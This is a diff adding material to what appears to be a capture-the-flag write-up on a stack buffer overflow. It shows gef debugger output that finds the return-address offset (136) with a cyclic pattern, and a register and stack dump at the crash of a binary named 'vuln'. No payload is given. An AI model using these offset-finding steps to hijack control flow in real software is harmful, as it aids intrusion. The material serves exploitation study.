@@ -117,4 +117,60 @@ def find_the_offset (NUM_CYCLIC_BYTES = 256):
         return offset # offset: 136
       
 ```
+or 
+```console 
+gef➤  pattern offset $rsp
+[+] Searching for '$rsp'
+[+] Found at offset 136 (little-endian search) likely
+[+] Found at offset 129 (big-endian search)
+```
+
+
+```console 
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x7a              
+$rbx   : 0x0               
+$rcx   : 0x007ffff7af4264  →  0x5477fffff0003d48 ("H="?)
+$rdx   : 0x007ffff7dd18c0  →  0x0000000000000000
+$rsp   : 0x007fffffffde38  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x007ffff7dd07e3  →  0xdd18c0000000000a ("\n"?)
+$rdi   : 0x1               
+$rip   : 0x00000000400770  →  <do_stuff+152> ret 
+$r8    : 0x79              
+$r9    : 0x0               
+$r10   : 0x0               
+$r11   : 0x246             
+$r12   : 0x1b              
+$r13   : 0x0               
+$r14   : 0x1b              
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x007fffffffde38│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rsp
+0x007fffffffde40│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde48│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde50│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde58│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde60│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde68│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x007fffffffde70│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
+     0x40076e <do_stuff+150>   nop    
+     0x40076f <do_stuff+151>   leave  
+ →   0x400770 <do_stuff+152>   ret    
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400770 → do_stuff()
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+
+```
+
+
 
